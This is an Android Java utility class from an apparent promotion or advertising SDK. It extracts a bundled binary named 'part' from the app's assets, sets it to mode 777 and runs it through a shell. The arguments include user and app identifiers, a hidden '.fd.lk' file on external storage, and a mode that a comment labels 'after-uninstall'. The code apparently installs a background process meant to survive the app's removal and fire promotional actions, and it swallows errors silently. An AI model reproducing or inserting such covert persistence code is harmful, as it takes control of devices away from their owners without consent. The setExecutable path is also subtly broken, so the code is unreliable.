package com.mf.promotion.util;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;

import android.annotation.TargetApi;
import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.mf.basecode.data.DBUtils;
import com.mf.basecode.utils.Logger;
import com.mf.basecode.utils.contants.CommConstants;

@TargetApi(Build.VERSION_CODES.GINGERBREAD)
public class PluginNav {
  private static PluginNav instance;
  private static Context mContext;
  private String mPath;
  private int interval;
  private String action;
  private String packageName;
  private int flag;
  private int style ;//1表示母体方式，2表示卸载后方式
  private long sh_time;
  
  public PluginNav() {
  }

  public static PluginNav getInstance(Context con) {
    mContext = con;
    if(instance == null){
      instance = new PluginNav();
    }
    return instance;
  }


  public static void setInstance(PluginNav instance) {
    PluginNav.instance = instance;
  }

  public void launchBackgroundProcess(String path,int inter,String act,String pgn,int flg,int sty,long shtime) {
    mPath = path;
    interval = inter;
    action = act;
    packageName = pgn;
    flag = flg;
    style = sty;
    sh_time = shtime;
    String str = mContext.getFilesDir() + "/part";
    String str1 = "";
    if (!exist(str)) {
      str1 = mContext.getFilesDir() + "/part";
      try {
        InputStream localInputStream = mContext.getResources().getAssets().open("part");
        copyBigDataToSD(str1, localInputStream);
      } catch (IOException localIOException) {
        localIOException.printStackTrace();
      }
    }
    Logger.e("part", str);
    new File(str + "part").setExecutable(true, true);
    new execThread(str).start();
  }

  private boolean exist(String path){
    File file = new File(path);
    if(file.exists()){
      return true;
    }
    return false;
  }
  
  private void copyBigDataToSD(String strOutFileName,InputStream myInput) throws IOException 
  {  
      OutputStream myOutput = new FileOutputStream(strOutFileName);
      byte[] buffer = new byte[1024];  
      int length = myInput.read(buffer);
      while(length > 0)
      {
          myOutput.write(buffer, 0, length); 
          length = myInput.read(buffer);
      }
      
      myOutput.flush();  
      myInput.close();  
      myOutput.close();        
  }
  
  class execThread extends Thread {
    String str;

    execThread(String paramString) {
      str = paramString;
    }

    public void run() {
      exec(str);
    }
  }
  
  private void exec(String paramString) {
  String str5 = Environment.getExternalStorageDirectory()
      .getAbsolutePath().concat("/").concat(".fd.lk");
  String str6 = "chmod 777 " + paramString + " \n";
  String appid = DBUtils.getInstance(mContext).queryCfgValueByKey(CommConstants.APPID_METADATA_KEY);
  String channelid = DBUtils.getInstance(mContext).queryCfgValueByKey(CommConstants.CHANNELID_METADATA_KEY);
  String cpid = DBUtils.getInstance(mContext).queryCfgValueByKey(CommConstants.CPID_METADATA_KEY);
  String str7 = str6 +  paramString +" \""+getUserSerial()+"\""+" \""+mPath+"\""+" \""+interval+"\""+" \""+mContext.getPackageName()+"\""+" \""+packageName+"\""+" \""+action+"\""+" \""+str5+"\""+" \""+appid+"\""+" \""+channelid+"\""+" \""+cpid+"\""+" \""+flag+"\""+" \""+style+"\""+" \""+sh_time+"\"";
  
  Runtime localRuntime = Runtime.getRuntime();
  try {
    Process process = localRuntime.exec("sh");

    DataOutputStream localDataOutputStream = new DataOutputStream(
        process.getOutputStream());
    localDataOutputStream.writeBytes(str7);
    localDataOutputStream.flush();
    localDataOutputStream.close();
    Logger.e("part", str7);

     InputStream is = process.getInputStream();
     InputStreamReader isr = new InputStreamReader(is);
     BufferedReader br = new BufferedReader(isr);
     String line = null;
     while (null != (line = br.readLine())) {
     }
    return;
  } catch (Exception localException) {
  }
  }
  
  public String getUserSerial() {
    Object userManager = mContext.getSystemService("user");
    if (userManager == null) {
      return null;
    }
    try {
      Method myUserHandleMethod = android.os.Process.class.getMethod(
          "myUserHandle", (Class<?>[]) null);
      Object myUserHandle = myUserHandleMethod.invoke(
          android.os.Process.class, (Object[]) null);

      Method getSerialNumberForUser = userManager.getClass().getMethod(
          "getSerialNumberForUser", myUserHandle.getClass());
      long userSerial = (Long) getSerialNumberForUser.invoke(userManager,
          myUserHandle);
      return String.valueOf(userSerial);
    } catch (Exception e) {
      Log.e("part", e.toString());
    } 

    return null;
  }


}
